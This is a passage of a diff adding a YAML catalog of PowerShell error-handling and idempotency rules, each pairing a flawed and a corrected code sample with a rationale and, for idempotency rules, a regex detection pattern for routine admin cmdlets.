+    foreach ($e in $errs) {
+        Write-Warning "Skipped '$($e.TargetObject)': $($e.Exception.Message)"
+    }
+  rationale: 2>&1 is for humans reading console output, not for object pipelines. Merged streams hand
+    ErrorRecord objects to code expecting data, producing null properties, failed casts, and corrupted
+    exports. Keep streams separate and use -ErrorVariable or explicit type filtering when errors must
+    be captured.
+  applies_to:
+  - powershell-5.1
+  - powershell-7
+  tags:
+  - errors
+- id: ERR-009
+  category: error-handling
+  severity: medium
+  title: Write-Error versus throw contract confusion in advanced functions
+  description: An advanced function mixes Write-Error (non-terminating, honors the caller's -ErrorAction)
+    and throw (terminating, ignores -ErrorAction) for comparable failures. Callers passing -ErrorAction
+    Stop see some failures escalate and others bypass their try/catch, so the function's error contract
+    is unpredictable.
+  bad: |
+    function Set-ServerState {
+        [CmdletBinding()]
+        param([string]$Name, [ValidateSet('Start', 'Stop')] [string]$State)
+        if (-not $Name) { throw 'Name is required' }      # terminating, ignores -ErrorAction Stop
+        if (-not (Test-Connection $Name -Quiet)) {
+            Write-Error "Host $Name unreachable"          # non-terminating, caller cannot trust it
+        }
+    }
+  good: |
+    function Set-ServerState {
+        [CmdletBinding()]
+        param([string]$Name, [ValidateSet('Start', 'Stop')] [string]$State)
+        if (-not $Name) {
+            $e = [System.ArgumentException]::new('Name is required')
+            $PSCmdlet.ThrowTerminatingError($e)           # terminating AND -ErrorAction aware
+        }
+        if (-not (Test-Connection $Name -Quiet)) {
+            Write-Error "Host $Name unreachable"          # deliberate non-terminating, documented
+        }
+    }
+  rationale: Pick one contract per failure class and document it. Use Write-Error for per-item non-terminating
+    failures so callers can control them with -ErrorAction while pipelines continue; use throw or $PSCmdlet.ThrowTerminatingError
+    for conditions that make the whole call meaningless. Arbitrary mixing breaks callers that rely on
+    -ErrorAction Stop inside try/catch.
+  applies_to:
+  - powershell-5.1
+  - powershell-7
+  tags:
+  - errors
+- id: ERR-010
+  category: error-handling
+  severity: medium
+  title: trap statement pitfalls; prefer explicit try/catch
+  description: The script uses trap for error handling. trap applies to an entire script or function scope,
+    fires after the failing statement rather than at a controlled point, has continue and break semantics
+    that reviewers routinely get wrong, and cannot be targeted at one risky call the way try/catch can.
+  bad: |
+    trap {
+        Write-Warning "Unhandled: $($_.Exception.Message)"
+        continue
+    }
+    Copy-Item -Path $src -Destination $dst -ErrorAction Stop
+    Remove-Item -Path $tmp -Recurse -ErrorAction Stop
+  good: |
+    try {
+        Copy-Item -Path $src -Destination $dst -ErrorAction Stop
+    }
+    catch {
+        Write-Warning "Copy failed: $($_.Exception.Message)"
+    }
+    try {
+        Remove-Item -Path $tmp -Recurse -ErrorAction Stop
+    }
+    catch {
+        Write-Warning "Cleanup failed: $($_.Exception.Message)"
+    }
+  rationale: trap hides which statement failed, applies to a whole scope, and its continue and break behavior
+    differs subtly between PowerShell 5.1 and 7, inviting silent regressions. Local try/catch keeps the
+    handler next to the risk, documents intent per call, and survives refactoring.
+  applies_to:
+  - powershell-5.1
+  - powershell-7
+  tags:
+  - errors
+- id: ERR-011
+  category: error-handling
+  severity: high
+  title: Missing finally-based cleanup leaks temp drives, files, and sessions on failure paths
+  description: Resources created mid-script such as PSDrives, temp files, and remote PSSessions are never
+    removed when a later statement throws, so every failed run leaks mapped drives, orphan sessions, and
+    stale temp data on the host.
+  bad: |
+    function Import-Data {
+        param([string]$Path)
+        New-PSDrive -Name Data -PSProvider FileSystem -Root $Path | Out-Null
+        $session = New-PSSession -ComputerName srv01
+        $temp = New-Item -Path (Join-Path $env:TEMP 'import.tmp') -ItemType File -Force
+        # any failure in Import-Csv or Send-ToServer leaves the drive, session and temp file behind
+        Import-Csv -Path $temp.FullName | Send-ToServer -Session $session
+        Remove-PSDrive -Name Data
+        Remove-PSSession -Session $session
+        Remove-Item -LiteralPath $temp.FullName -Force
+    }
+  good: |
+    function Import-Data {
+        param([string]$Path)
+        $drive = $null
+        $session = $null
+        $temp = $null
+        try {
+            $drive = New-PSDrive -Name Data -PSProvider FileSystem -Root $Path -PassThru
+            $session = New-PSSession -ComputerName srv01
+            $temp = New-Item -Path (Join-Path $env:TEMP 'import.tmp') -ItemType File -Force
+            Import-Csv -Path $temp.FullName | Send-ToServer -Session $session
+        }
+        finally {
+            if ($drive) { Remove-PSDrive -Name $drive.Name -Force -ErrorAction SilentlyContinue }
+            if ($session) { Remove-PSSession -Session $session -ErrorAction SilentlyContinue }
+            if ($temp -and (Test-Path -LiteralPath $temp.FullName)) {
+                Remove-Item -LiteralPath $temp.FullName -Force -ErrorAction SilentlyContinue
+            }
+        }
+    }
+  rationale: finally runs on the success path and on every termination path, so acquired resources are
+    released deterministically even when the failure is rethrown to the caller.
+  applies_to:
+  - powershell-5.1
+  - powershell-7
+  tags:
+  - errors
+  - resilience
+- id: ERR-012
+  category: error-handling
+  severity: medium
+  title: No retry with bounded exponential backoff for transient HTTP 429 and 503 responses in Invoke-RestMethod
+    loops
+  description: Paged Invoke-RestMethod calls treat throttling and temporary availability responses as
+    fatal, so a single 429 or 503 in the middle of a loop aborts an otherwise recoverable sync and leaves
+    partial results behind.
+  bad: |
+    function Get-AllItems {
+        param([string]$Token)
+        $results = @()
+        foreach ($page in 1..50) {
+            $results += Invoke-RestMethod -Uri "https://api.contoso.com/items?page=$page" `
+                -Headers @{ Authorization = "Bearer $Token" }
+        }
+        $results
+    }
+  good: |
+    function Invoke-RestWithBackoff {
+        param(
+            [Parameter(Mandatory)][string]$Uri,
+            [hashtable]$Headers,
+            [int]$MaxAttempts = 5,
+            [double]$InitialDelaySeconds = 1
+        )
+        for ($attempt = 1; $attempt -le $MaxAttempts; $attempt++) {
+            try {
+                return Invoke-RestMethod -Uri $Uri -Headers $Headers -ErrorAction Stop
+            }
+            catch {
+                $status = $null
+                if ($_.Exception.Response) {
+                    $status = [int]$_.Exception.Response.StatusCode
+                }
+                if ($status -notin 429, 503 -or $attempt -ge $MaxAttempts) { throw }
+                $delay = $InitialDelaySeconds * [math]::Pow(2, $attempt - 1)
+                Write-Warning "HTTP $status on attempt $attempt of $MaxAttempts. Retrying in $delay seconds."
+                Start-Sleep -Seconds $delay
+            }
+        }
+    }
+
+    function Get-AllItems {
+        param([string]$Token)
+        $results = @()
+        foreach ($page in 1..50) {
+            $results += Invoke-RestWithBackoff -Uri "https://api.contoso.com/items?page=$page" `
+                -Headers @{ Authorization = "Bearer $Token" }
+        }
+        $results
+    }
+  rationale: Throttling and temporary outages are self-healing, so a small bounded exponential backoff
+    converts flaky loops into reliable ones while still failing fast on non-retryable errors and once
+    the attempt budget is spent.
+  applies_to:
+  - powershell-5.1
+  - powershell-7
+  tags:
+  - errors
+  - resilience
+- id: ERR-013
+  category: error-handling
+  severity: medium
+  title: Service restart without bounded retry and health re-check after Stop-Service or Start-Service
+  description: Restart logic stops and starts a service and immediately reports success, so a service
+    that crashes during startup or a transiently failing Start-Service is never detected and downstream
+    steps run against a dead dependency.
+  bad: |
+    function Restart-ContosoAgent {
+        param([string]$Name)
+        Stop-Service -Name $Name -Force -ErrorAction Stop
+        Start-Service -Name $Name -ErrorAction Stop
+        Start-Sleep -Seconds 2
+        # assumes a started service is a healthy service
+        Write-Output "$Name restarted"
+    }
+  good: |
+    function Restart-ContosoAgent {
+        param([string]$Name, [int]$TimeoutSeconds = 60)
+        Stop-Service -Name $Name -Force -ErrorAction Stop
+        $started = $false
+        for ($attempt = 1; $attempt -le 3 -and -not $started; $attempt++) {
+            try {
+                Start-Service -Name $Name -ErrorAction Stop
+                $started = $true
+            }
+            catch {
+                if ($attempt -ge 3) { throw }
+                Start-Sleep -Seconds (2 * $attempt)
+            }
+        }
+        $deadline = (Get-Date).AddSeconds($TimeoutSeconds)
+        while ((Get-Date) -lt $deadline) {
+            $svc = Get-Service -Name $Name -ErrorAction SilentlyContinue
+            if ($svc -and $svc.Status -eq 'Running') { return $svc }
+            Start-Sleep -Seconds 2
+        }
+        throw "Service $Name did not reach Running state within $TimeoutSeconds seconds."
+    }
+  rationale: A service can accept Start-Service yet crash seconds later, so a bounded health poll with
+    a hard timeout is the only way a caller can trust the reported state instead of a sleep-and-hope assumption.
+  applies_to:
+  - powershell-5.1
+  - powershell-7
+  tags:
+  - errors
+  - resilience
+- id: ERR-014
+  category: error-handling
+  severity: high
+  title: Critical function parameters lack ValidateNotNullOrEmpty and ValidateSet and fail late instead
+    of at binding
+  description: Public functions accept unvalidated parameters and only crash deep inside the body when
+    the value is finally used, producing stack traces far from the caller mistake and sometimes after
+    destructive partial work has already run.
+  bad: |
+    function Set-RetryPolicy {
+        param(
+            [string]$Environment,
+            [int]$MaxAttempts,
+            [string]$WebhookUrl
+        )
+        if ($Environment -eq 'prod' -and $MaxAttempts -lt 1) {
+            throw 'MaxAttempts must be at least 1 for prod'
+        }
+        Set-ConfigValue -Key "$Environment.retries" -Value $MaxAttempts
+        Register-AlertSink -Url $WebhookUrl
+    }
+  good: |
+    function Set-RetryPolicy {
+        param(
+            [Parameter(Mandatory)]
+            [ValidateSet('dev', 'qa', 'prod')]
+            [string]$Environment,
+
+            [ValidateRange(1, 20)]
+            [int]$MaxAttempts = 3,
+
+            [ValidateNotNullOrEmpty()]
+            [ValidatePattern('^https://')]
+            [string]$WebhookUrl
+        )
+        Set-ConfigValue -Key "$Environment.retries" -Value $MaxAttempts
+        Register-AlertSink -Url $WebhookUrl
+    }
+  rationale: Parameter validation rejects bad input at binding time with a clear message before any side
+    effect runs, which is cheaper and safer than defensive throws scattered through the function body.
+  applies_to:
+  - powershell-5.1
+  - powershell-7
+  tags:
+  - errors
+  - resilience
+- id: ERR-015
+  category: error-handling
+  severity: medium
+  title: File paths are bound without Test-Path prechecks and fail with opaque errors deep in the script
+  description: Scripts pass constructed or user-supplied paths straight into Get-Content, Copy-Item, or
+    import cmdlets, so a missing file surfaces as a provider exception mid-run after earlier steps have
+    already mutated state.
+  bad: |
+    $configPath = Join-Path $PSScriptRoot 'settings.psd1'
+    $backupFile = "$env:ProgramFiles\Contoso\backup\last.bak"
+    $config = Get-Content -Path $configPath -Raw | ConvertFrom-Json
+    Copy-Item -Path $backupFile -Destination $configPath -Force
+  good: |
+    $configPath = Join-Path $PSScriptRoot 'settings.psd1'
+    $backupFile = Join-Path $env:ProgramFiles 'Contoso\backup\last.bak'
+    if (-not (Test-Path -LiteralPath $configPath -PathType Leaf)) {
+        throw "Required configuration file not found: $configPath"
+    }
+    if (-not (Test-Path -LiteralPath $backupFile -PathType Leaf)) {
+        throw "Backup file not found: $backupFile"
+    }
+    $config = Get-Content -LiteralPath $configPath -Raw | ConvertFrom-Json
+    Copy-Item -LiteralPath $backupFile -Destination $configPath -Force
+  rationale: Explicit precondition checks turn a mid-script crash with a confusing provider error into
+    a single clear message at the exact point where the assumption was made, before any state was changed.
+  applies_to:
+  - powershell-5.1
+  - powershell-7
+  tags:
+  - errors
+  - resilience
+- id: ERR-016
+  category: error-handling
+  severity: high
+  title: Continue and Break misused inside foreach catch blocks silently skip or abort entire batches
+  description: A break in a catch abandons every remaining loop item while the caller sees a normal return,
+    and a continue without recording the failure hides the item entirely, so batch outcomes are wrong
+    in both directions.
+  bad: |
+    $results = @()
+    foreach ($server in $servers) {
+        try {
+            $results += Invoke-Deployment -Server $server -ErrorAction Stop
+        }
+        catch {
+            break   # aborts all remaining servers; caller sees a normal return
+        }
+    }
+    Write-Output "Deployed to $($results.Count) servers"
+  good: |
+    $results = @()
+    $failures = @()
+    foreach ($server in $servers) {
+        try {
+            $results += Invoke-Deployment -Server $server -ErrorAction Stop
+        }
+        catch {
+            $failures += [pscustomobject]@{ Server = $server; Message = $_.Exception.Message }
+            continue   # record this failure and move on to the next server
+        }
+    }
+    if ($failures.Count -gt 0) {
+        $failures | Format-Table -AutoSize | Out-String | Write-Warning
+        throw "$($failures.Count) of $($servers.Count) deployments failed."
+    }
+  rationale: Loop control keywords inside catch change the blast radius of a single failure, so each catch
+    must decide explicitly between isolate-and-continue and fail-fast, and the chosen policy must be visible
+    in the batch result.
+  applies_to:
+  - powershell-5.1
+  - powershell-7
+  tags:
+  - errors
+  - resilience
+- id: ERR-017
+  category: error-handling
+  severity: medium
+  title: Logging only the exception message discards rich ErrorRecord fields needed for diagnosis
+  description: Catch blocks write only the Exception.Message to the log, losing FullyQualifiedErrorId,
+    ScriptStackTrace, CategoryInfo, and TargetObject, so on-call engineers cannot tell which cmdlet, parameter,
+    or call site produced the failure.
+  bad: |
+    try {
+        Sync-Inventory -Server $server -ErrorAction Stop
+    }
+    catch {
+        Write-Log -Level Error -Message $_.Exception.Message
+    }
+  good: |
+    try {
+        Sync-Inventory -Server $server -ErrorAction Stop
+    }
+    catch {
+        Write-Log -Level Error -Message (
+            "Inventory sync failed for $server. " +
+            "Exception: $($_.Exception.Message). " +
+            "ErrorId: $($_.FullyQualifiedErrorId). " +
+            "Category: $($_.CategoryInfo.Category). " +
+            "Target: $($_.TargetObject). " +
+            "StackTrace: $($_.ScriptStackTrace)"
+        )
+        throw
+    }
+  rationale: The ErrorRecord carries the fully qualified error id, category, target object, and script
+    stack trace that map a failure to the exact cmdlet and call site, and that context is unrecoverable
+    once only the message string is captured.
+  applies_to:
+  - powershell-5.1
+  - powershell-7
+  tags:
+  - errors
+  - resilience
+- id: ERR-018
+  category: error-handling
+  severity: high
+  title: Bare throw of a new message in catch blocks loses the original exception context
+  description: Catch blocks replace the caught exception with a brand-new string via throw with an argument,
+    so the original exception type, ErrorRecord, and stack trace are gone and callers can no longer match
+    or diagnose the root cause.
+  bad: |
+    try {
+        Import-Module $modulePath -ErrorAction Stop
+    }
+    catch {
+        throw "Module import failed"   # original exception, error id and stack trace are discarded
+    }
+  good: |
+    try {
+        Import-Module $modulePath -ErrorAction Stop
+    }
+    catch {
+        Write-Verbose "Failed to import module from $modulePath"
+        throw   # rethrows the original ErrorRecord with full context intact
+    }
+  rationale: A parameterless throw rethrows the active ErrorRecord unchanged, preserving the exception
+    type, FullyQualifiedErrorId, and stack trace, while situational context such as the current path or
+    item can still be logged before the rethrow.
+  applies_to:
+  - powershell-5.1
+  - powershell-7
+  tags:
+  - errors
+  - resilience
+- id: ERR-019
+  category: error-handling
+  severity: high
+  title: Scripts exit 0 even after caught failures so callers and CI gates cannot detect breakage
+  description: Catch blocks log the failure and then execution falls through to a hardcoded successful
+    exit code, which turns every failed run green in CI, task schedulers, and wrapper tooling that only
+    read the process exit code.
+  bad: |
+    try {
+        Invoke-CriticalCheck -Environment 'qa' -ErrorAction Stop
+    }
+    catch {
+        Write-Error $_
+    }
+    exit 0   # always green regardless of the failure above
+  good: |
+    $exitCode = 0
+    try {
+        Invoke-CriticalCheck -Environment 'qa' -ErrorAction Stop
+    }
+    catch {
+        Write-Error $_
+        $exitCode = 1
+    }
+    exit $exitCode
+  rationale: The process exit code is the only contract most CI systems and schedulers consume, so a caught
+    failure must be translated into a nonzero exit code or the entire error-handling effort stays invisible
+    to callers.
+  applies_to:
+  - powershell-5.1
+  - powershell-7
+  tags:
+  - errors
+  - resilience
+- id: ERR-020
+  category: error-handling
+  severity: medium
+  title: Count is read on possibly single-item or null pipeline results without array wrapping
+  description: Code assumes a cmdlet or function always returns an array, but PowerShell unrolls empty
+    and single-item results, so under Set-StrictMode a Count read on a null result throws and batch guards
+    miscount or crash.
+  bad: |
+    Set-StrictMode -Version Latest
+    $expired = Get-ExpiredCertificates -Server $server
+    if ($expired.Count -gt 0) {
+        foreach ($cert in $expired) { Revoke-Certificate -Thumbprint $cert.Thumbprint }
+    }
+    # when Get-ExpiredCertificates emits nothing, $expired is $null and .Count throws under strict mode
+  good: |
+    Set-StrictMode -Version Latest
+    $expired = @(Get-ExpiredCertificates -Server $server)
+    if ($expired.Count -gt 0) {
+        foreach ($cert in $expired) { Revoke-Certificate -Thumbprint $cert.Thumbprint }
+    }
+  rationale: Wrapping a pipeline in @() guarantees an array with a reliable Count for zero, one, or many
+    results, which keeps strict-mode scripts and batch guards correct regardless of how many items the
+    pipeline emits.
+  applies_to:
+  - powershell-5.1
+  - powershell-7
+  tags:
+  - errors
+  - resilience
+- id: IDEM-001
+  category: idempotency
+  severity: medium
+  title: Guard New-Item file and directory creation with Test-Path
+  description: A bare New-Item call throws an item-already-exists error on the second run and aborts the
+    script midway, leaving later steps unexecuted. Read the target first with Test-Path -LiteralPath and
+    create only what is missing so every rerun converges to the same tree.
+  bad: |
+    New-Item -Path 'C:\ProgramData\MyApp' -ItemType Directory | Out-Null
+    New-Item -Path 'C:\ProgramData\MyApp\logs' -ItemType Directory | Out-Null
+    New-Item -Path 'C:\ProgramData\MyApp\logs\app.log' -ItemType File | Out-Null
+  good: |
+    $root = 'C:\ProgramData\MyApp'
+    $log  = Join-Path $root 'logs\app.log'
+    foreach ($dir in @($root, (Split-Path $log -Parent))) {
+        if (-not (Test-Path -LiteralPath $dir -PathType Container)) {
+            New-Item -Path $dir -ItemType Directory | Out-Null
+        }
+    }
+    if (-not (Test-Path -LiteralPath $log -PathType Leaf)) {
+        New-Item -Path $log -ItemType File | Out-Null
+    }
+  rationale: Automation scripts are re-run by definition; creation must be read-first so run two reaches
+    identical state instead of failing on existing items and skipping dependent steps.
+  applies_to:
+  - powershell-5.1
+  - powershell-7
+  tags:
+  - converge
+  - rerun-safe
+  - filesystem
+  detection:
+    pattern: \bNew-Item\b(?=[^\n]*-ItemType[ ]+(Directory|File))
+- id: IDEM-002
+  category: idempotency
+  severity: high
+  title: Check principal existence before New-LocalUser and New-Service
+  description: Creating local accounts or Windows services unconditionally fails on rerun because the
+    principal already exists. Probe with Get-LocalUser or Get-Service first, create only when absent,
+    and leave existing principals untouched rather than recreating or resetting them blindly.
+  bad: |
+    New-LocalUser -Name 'svcDeploy' -NoPassword -AccountNeverExpires | Out-Null
+    New-Service -Name 'MyAppAgent' -BinaryPathName 'C:\MyApp\agent.exe' -StartupType Automatic
+  good: |
+    if (-not (Get-LocalUser -Name 'svcDeploy' -ErrorAction SilentlyContinue)) {
+        New-LocalUser -Name 'svcDeploy' -NoPassword -AccountNeverExpires | Out-Null
+    }
+    if (-not (Get-Service -Name 'MyAppAgent' -ErrorAction SilentlyContinue)) {
+        New-Service -Name 'MyAppAgent' -BinaryPathName 'C:\MyApp\agent.exe' -StartupType Automatic | Out-Null
+    }
+  rationale: Duplicate account creation attempts are hard failures, and force-recreating service definitions
+    can orphan credentials and ACL grants; existence guards keep reruns side-effect free.
+  applies_to:
+  - powershell-5.1
+  - powershell-7
+  tags:
+  - converge
+  - rerun-safe
+  - accounts
+  detection:
+    pattern: \b(New-LocalUser|New-Service)\b
+- id: IDEM-003
+  category: idempotency
+  severity: high
+  title: Pin and probe before Install-Module instead of blind -Force reinstalls
+  description: Install-Module -Force on every run re-downloads whatever the gallery currently serves,
+    so successive runs get different versions and unrelated behavior changes. Check Get-InstalledModule
+    first, pass an explicit RequiredVersion for determinism, and reserve -SkipPublisherCheck for a deliberate
+    trust decision rather than a blanket rerun flag.
+  bad: |
+    Install-Module -Name Pester -Force -Scope CurrentUser
+  good: |
+    $name    = 'Pester'
+    $version = '5.5.0'
+    if (-not (Get-InstalledModule -Name $name -RequiredVersion $version -ErrorAction SilentlyContinue)) {
+        Install-Module -Name $name -RequiredVersion $version -Scope CurrentUser -SkipPublisherCheck
+    }
+  rationale: Convergence means reaching a known pinned state; unpinned forced installs make reruns non-deterministic
+    and can downgrade or upgrade dependencies mid-pipeline.
+  applies_to:
+  - powershell-5.1
+  - powershell-7
+  tags:
+  - converge
+  - packages
+  - version-pin
+  detection:
+    pattern: \bInstall-Module\b(?=[^\n]*-Force)
+- id: IDEM-004
+  category: idempotency
+  severity: medium
+  title: Verify group membership before Add-ADGroupMember
+  description: Adding a user who is already a member raises a terminating error and stops the run. Enumerate
+    current members with Get-ADGroupMember and add only missing principals so the membership set converges
+    instead of erroring.
+  bad: |
+    Add-ADGroupMember -Identity 'App-Admins' -Members 'jdoe'
+  good: |
+    $group = 'App-Admins'
+    $user  = 'jdoe'
+    $members = Get-ADGroupMember -Identity $group -Recursive |
+        Select-Object -ExpandProperty SamAccountName
+    if ($members -notcontains $user) {
+        Add-ADGroupMember -Identity $group -Members $user
+    }
+  rationale: Active Directory treats duplicate membership as an error, so a second run of an unguarded
+    grant aborts; the read-first guard makes the desired-state statement safely repeatable.
+  applies_to:
+  - powershell-5.1
+  - powershell-7
+  tags:
+  - converge
+  - rerun-safe
+  - active-directory
+  detection:
+    pattern: \bAdd-ADGroupMember\b
+- id: IDEM-005
+  category: idempotency
+  severity: medium
+  title: Ensure registry properties read-first instead of erroring or force-clobbering
+  description: New-ItemProperty without -Force errors once the value exists, while -Force rewrites it
+    on every run and destroys operator-tuned data. Read the property first, create it when absent, and
+    rewrite only on a detected type or policy drift so steady state produces zero writes.
+  bad: |
+    New-ItemProperty -Path 'HKLM:\SOFTWARE\MyApp' -Name 'RetryCount' -Value 3 -PropertyType DWord | Out-Null
+    New-ItemProperty -Path 'HKLM:\SOFTWARE\MyApp' -Name 'InstallStamp' -Value 'bootstrap' -PropertyType String -Force | Out-Null
+  good: |
+    $key  = 'HKLM:\SOFTWARE\MyApp'
+    $name = 'RetryCount'
+    $prop = Get-ItemProperty -LiteralPath $key -ErrorAction SilentlyContinue
+    $current = if ($prop) { $prop.PSObject.Properties[$name] } else { $null }
+    if (-not $current) {
+        New-ItemProperty -LiteralPath $key -Name $name -Value 3 -PropertyType DWord | Out-Null
+    }
+    elseif ($current.Value -isnot [int]) {
+        Set-ItemProperty -LiteralPath $key -Name $name -Value 3 -Type DWord
+    }
+  rationale: 'Both failure modes break convergence: the unguarded create aborts reruns and the forced
+    create erases legitimate local edits, so the script must write only when reality differs from desired
+    state.'
+  applies_to:
+  - powershell-5.1
+  - powershell-7
+  tags:
+  - converge
+  - registry
+  detection:
+    pattern: \b(New-ItemProperty|Set-ItemProperty)\b
+- id: IDEM-006
+  category: idempotency
+  severity: medium
+  title: Deduplicate hosts-file appends with Select-String before Add-Content
+  description: Appending an entry to the hosts file on every run stacks duplicate lines indefinitely.
+    Search for the entry first with Select-String and append only when it is missing.
+  bad: |
+    Add-Content -Path "$env:SystemRoot\System32\drivers\etc\hosts" -Value '10.1.2.3 build.internal'
+  good: |
+    $hostsFile = "$env:SystemRoot\System32\drivers\etc\hosts"
+    $entry     = '10.1.2.3 build.internal'
+    if (-not (Select-String -LiteralPath $hostsFile -SimpleMatch $entry -Quiet)) {
+        Add-Content -LiteralPath $hostsFile -Value $entry
+    }
+  rationale: Append-only mutations are the classic non-convergent pattern; without a presence check each
+    rerun grows the artifact until name resolution and diffs become noisy.
+  applies_to:
+  - powershell-5.1
+  - powershell-7
+  tags:
+  - converge
+  - dedupe
+  - files
+  detection:
+    pattern: Add-Content[^\n]*hosts
+- id: IDEM-007
+  category: idempotency
+  severity: medium
+  title: Detect an existing ACE before adding ACL grants
+  description: Get-Acl plus AddAccessRule plus Set-Acl stacks an identical ACE on every run, bloating
+    the security descriptor. Compare existing Access entries against the desired identity, rights, and
+    type, and call Set-Acl only when the grant is genuinely missing.
+  bad: |
+    $acl = Get-Acl -Path 'C:\ProgramData\MyApp'
+    $rule = New-Object System.Security.AccessControl.FileSystemAccessRule('CONTOSO\svcMyApp', 'Modify', 'ContainerInherit,ObjectInherit', 'None', 'Allow')
+    $acl.AddAccessRule($rule)
+    Set-Acl -Path 'C:\ProgramData\MyApp' -AclObject $acl
+  good: |
+    $path = 'C:\ProgramData\MyApp'
+    $sid  = 'CONTOSO\svcMyApp'
+    $acl  = Get-Acl -LiteralPath $path
+    $grant = New-Object System.Security.AccessControl.FileSystemAccessRule($sid, 'Modify', 'ContainerInherit,ObjectInherit', 'None', 'Allow')
+    $hasAce = @($acl.Access | Where-Object {
+        $_.IdentityReference.Value -eq $sid -and
+        $_.AccessControlType -eq 'Allow' -and
+        ($_.FileSystemRights -band [System.Security.AccessControl.FileSystemRights]::Modify)
+    }).Count -gt 0
+    if (-not $hasAce) {
+        $acl.AddAccessRule($grant)
+        Set-Acl -LiteralPath $path -AclObject $acl
+    }
+  rationale: ACL mutation is set semantics, not append semantics; duplicate ACEs never fail loudly but
+    silently diverge from the reviewed baseline and slow descriptor evaluation.
+  applies_to:
+  - powershell-5.1
+  - powershell-7
+  tags:
+  - converge
+  - acl
+  - security
+  detection:
+    pattern: \b(AddAccessRule|Set-Acl)\b
+- id: IDEM-008
+  category: idempotency
+  severity: high
+  title: Gate New-NetFirewallRule on a stable rule name that may already exist
+  description: New-NetFirewallRule without an explicit Name auto-generates a fresh GUID per invocation,
+    so reruns pile up duplicate inbound rules. Probe Get-NetFirewallRule -Name first, create when absent,
+    and reconcile drift with Set-NetFirewallRule when present.
+  bad: |
+    New-NetFirewallRule -DisplayName 'MyApp HTTP' -Direction Inbound -Protocol TCP -LocalPort 8080 -Action Allow
+  good: |
+    $ruleName = 'MyApp-HTTP-In-TCP8080'
+    if (-not (Get-NetFirewallRule -Name $ruleName -ErrorAction SilentlyContinue)) {
+        New-NetFirewallRule -Name $ruleName -DisplayName 'MyApp HTTP' -Direction Inbound `
+            -Protocol TCP -LocalPort 8080 -Action Allow | Out-Null
+    }
+    else {
+        Set-NetFirewallRule -Name $ruleName -Enabled True -Action Allow
+    }
+  rationale: Unnamed firewall rules make reruns accumulate attack surface and stale permits; a deterministic
+    name plus existence check turns creation into a convergent operation.
+  applies_to:
+  - powershell-5.1
+  - powershell-7
+  tags:
+  - converge
+  - network
+  detection:
+    pattern: \bNew-NetFirewallRule\b(?![^\n]*-Name[ ]+\S)
+- id: IDEM-009
+  category: idempotency
+  severity: high
+  title: Make Register-ScheduledTask overwrite-aware instead of erroring or blind-forcing
+  description: Registering an existing task name fails on rerun, while reflexive -Force silently replaces
+    a definition an operator may have tuned. Check Get-ScheduledTask first, update through Set-ScheduledTask
+    when the task exists, and use -Force only when the script explicitly owns the task definition.
+  bad: |
+    $action = New-ScheduledTaskAction -Execute 'C:\MyApp\task.exe'
+    Register-ScheduledTask -TaskName 'MyAppMaintenance' -Action $action
+    Register-ScheduledTask -TaskName 'MyAppMaintenance' -Action $action -Force
+  good: |
+    $action   = New-ScheduledTaskAction -Execute 'C:\MyApp\task.exe'
+    $taskName = 'MyAppMaintenance'
+    if (Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue) {
+        Set-ScheduledTask -TaskName $taskName -Action $action | Out-Null
+    }
+    else {
+        Register-ScheduledTask -TaskName $taskName -Action $action | Out-Null
+    }
+  rationale: The error path breaks reruns and the -Force path discards manual scheduling changes; explicit
+    existence handling keeps the task converged without surprise deletions of hand-edited triggers or
+    credentials.
+  applies_to:
+  - powershell-5.1
+  - powershell-7
+  tags:
+  - converge
+  - scheduler
+  detection:
+    pattern: \bRegister-ScheduledTask\b
+- id: IDEM-010
+  category: idempotency
+  severity: medium
+  title: Converge environment variables instead of appending duplicate values
+  description: Setting a constant value through Environment.SetEnvironmentVariable is naturally idempotent,
+    but read-modify-write patterns that concatenate, such as extending Path, duplicate the entry on every
+    run. Split the current value, test membership, and write back only when the component is missing.
+  bad: |
+    $current = [Environment]::GetEnvironmentVariable('Path', 'Machine')
+    [Environment]::SetEnvironmentVariable('Path', "$current;C:\MyApp\bin", 'Machine')
+  good: |
+    $add     = 'C:\MyApp\bin'
+    $current = [Environment]::GetEnvironmentVariable('Path', 'Machine')
+    $parts   = @($current -split ';' | Where-Object { $_ })
+    if ($parts -notcontains $add) {
+        $merged = (@($parts) + $add) -join ';'
+        [Environment]::SetEnvironmentVariable('Path', $merged, 'Machine')
+    }
+  rationale: Environment state must reach one stable value per run; unchecked concatenation grows PATH
+    without bound, slows lookup, and makes machine configuration differ depending on how many times the
+    script ran.
+  applies_to:
+  - powershell-5.1
+  - powershell-7
+  tags:
+  - converge
+  - environment
+  detection:
+    pattern: SetEnvironmentVariable
+- id: IDEM-011
+  category: idempotency
+  severity: medium
+  title: Look up DNS records before Add-DnsServerResourceRecord
+  description: Adding a resource record that already exists raises a record-exists error and stops the
+    run. Query Get-DnsServerResourceRecord for the exact name and type, add only when missing, and repair
+    the address only when the record drifted from the desired value.
+  bad: |
+    Add-DnsServerResourceRecordA -ZoneName 'contoso.local' -Name 'build' -IPv4Address '10.1.2.3'
+  good: |
+    $zone = 'contoso.local'
+    $name = 'build'
+    $ip   = '10.1.2.3'
+    $record = Get-DnsServerResourceRecord -ZoneName $zone -Name $name -RRType A -ErrorAction SilentlyContinue
+    if (-not $record) {
+        Add-DnsServerResourceRecordA -ZoneName $zone -Name $name -IPv4Address $ip
+    }
+    elseif ($record.RecordData.IPv4Address.IPAddressToString -ne $ip) {
+        Remove-DnsServerResourceRecord -ZoneName $zone -RRType A -Name $name -Force
+        Add-DnsServerResourceRecordA -ZoneName $zone -Name $name -IPv4Address $ip
+    }
+  rationale: DNS zones reject duplicates, so unguarded creates turn the second run into a failure; the
+    ensure pattern converges the record to the declared address regardless of prior state.
+  applies_to:
+  - powershell-5.1
+  - powershell-7
+  tags:
+  - converge
+  - dns
+  detection:
+    pattern: \bAdd-DnsServerResourceRecord[A-Za-z]*\b
+- id: IDEM-012
+  category: idempotency
+  severity: medium
+  title: Ensure junctions and symbolic links with existence and target checks
+  description: Recreating a Junction or SymbolicLink fails while the link exists and silently leaves a
+    stale link pointing at an old target. Inspect the existing item, create the link when absent, and
+    rebuild it only when its target differs from the desired one.
+  bad: |
+    New-Item -Path 'C:\Deploy\current' -ItemType Junction -Value 'C:\Releases\v42' | Out-Null
+  good: |
+    $link   = 'C:\Deploy\current'
+    $target = 'C:\Releases\v42'
+    $item = Get-Item -LiteralPath $link -ErrorAction SilentlyContinue -Force
+    if ($item -and $item.LinkType) {
+        if ($item.Target -ne $target) {
+            $item.Delete()
